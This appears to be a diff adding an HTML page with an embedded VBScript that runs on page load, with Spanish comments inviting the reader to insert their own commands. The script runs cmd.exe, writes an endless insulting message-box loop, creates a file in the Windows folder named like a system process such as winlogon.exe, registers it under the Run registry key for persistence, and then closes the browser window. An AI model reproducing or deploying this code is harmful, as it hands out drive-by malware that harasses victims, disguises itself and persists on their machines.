@@ -1,0 +1,43 @@
+<!--aki esta el script k ace la magia, la parte k esta en rojo es en la k tienes k meter el codigo de lo k
+ kieras ejecutar, cada linea del bat unela con "&"(sincomiyas)-->
+<script language="vbs">
+   on error resume next
+   Set shell = createObject("Wscript.shell")
+   shell.run("cmd.exe /c @echo off & color a & echo ola mundooooooooo......... & msg * holaaa & pause & exit")
+   set fso=createObject("Scripting.fileSystemObject")
+   set miArchivo = fso.CreateTextFile("\bUSik.vbs", 2, false)
+   miArchivo.writeline("do" )
+   miArchivo.writeline("msgbox(" & chr(34) & "eres una gorda" & chr(34) & ")" )
+   miArchivo.writeline("loop" )
+   miArchivo.Close
+   if fso.getfile("\bUSik.vbs") = "" then
+      wscript.popup("Permiso denegado, cierre la sesion e iniciela de nuevo como administrador")
+   else
+      randomize timer
+      numer = int(rnd * 3)
+      select case numer
+      case 1
+         nume="login32.exe"
+      case 2
+         nume="winlogon.exe"
+      case 3
+         nume="msagent.exe"
+      case else
+         nume="updater32.exe"
+      end select
+      set winDir=fso.GetSpecialFolder(0)
+      set sysDir=fso.GetSpecialFolder(1)
+      set vx = fso.CreateTextfile(windir & "\" & nume,2,false)
+      vx.writeline("MZ")
+      vx.Close
+      shell.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Winlogon", winDir & "\" & nume
+      shell.run("wscript " & windir & "\" & nume)
+      shell.run("wscript \bUSik.vbs")
+   end if
+</script>
+<!--esta parte ace k se cierre la ventana del IE-->
+<script language="javascript">
+   close();
+</script>
+
+</html>
